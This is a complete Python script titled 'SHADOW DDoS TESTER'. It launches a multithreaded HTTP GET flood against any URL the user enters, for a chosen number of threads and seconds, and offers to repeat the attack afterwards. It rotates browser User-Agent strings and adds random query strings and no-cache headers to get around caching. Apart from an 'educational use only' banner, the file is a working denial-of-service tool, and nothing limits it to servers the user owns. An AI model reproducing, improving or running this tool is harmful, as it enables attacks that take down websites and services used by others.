import threading
import requests
import time
import random
import string
import os
from colorama import Fore, Style, init

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(Fore.RED + Style.BRIGHT + """
███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║
███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║
╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║
███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝
       ⚔️ SHADOW DDoS TESTER ⚔️
     ⚠️ FOR EDUCATIONAL USE ONLY ⚠️
""")

def random_query():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def attack(target, end_time):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
        "Mozilla/5.0 (Android 11; Mobile)"
    ]

    while time.time() < end_time:
        try:
            url = f"{target}?r={random_query()}"
            headers = {
                "User-Agent": random.choice(user_agents),
                "Cache-Control": "no-cache",
                "Accept": "*/*"
            }
            response = requests.get(url, headers=headers, timeout=3)
            print(Fore.GREEN + f"[✓] HIT {url} | Status: {response.status_code}")
        except:
            print(Fore.MAGENTA + "[×] Request Failed")

def run_ddos():
    clear()
    banner()
    target = input(Fore.YELLOW + "🌐 Enter target URL: ").strip()
    threads = int(input(Fore.CYAN + "🔧 Number of threads: "))
    duration = int(input(Fore.CYAN + "⏱️  Duration (in seconds): "))

    print(Fore.LIGHTBLUE_EX + f"\n🚀 Attacking {target} with {threads} threads for {duration} seconds...\n")

    end_time = time.time() + duration
    thread_list = []

    for _ in range(threads):
        t = threading.Thread(target=attack, args=(target, end_time))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print(Fore.GREEN + "\n✅ Shadow DDoS test finished. Check your server logs.")
    after_menu()

def after_menu():
    print(Fore.YELLOW + "\n📋 What do you want to do next?")
    print("1. 🔁 Repeat attack")
    print("2. ❌ Exit")

    choice = input("👉 Choose (1/2): ").strip()
    if choice == '1':
        run_ddos()
    else:
        print(Fore.CYAN + "👋 Bye!")
        exit()

if __name__ == "__main__":
    run_ddos()
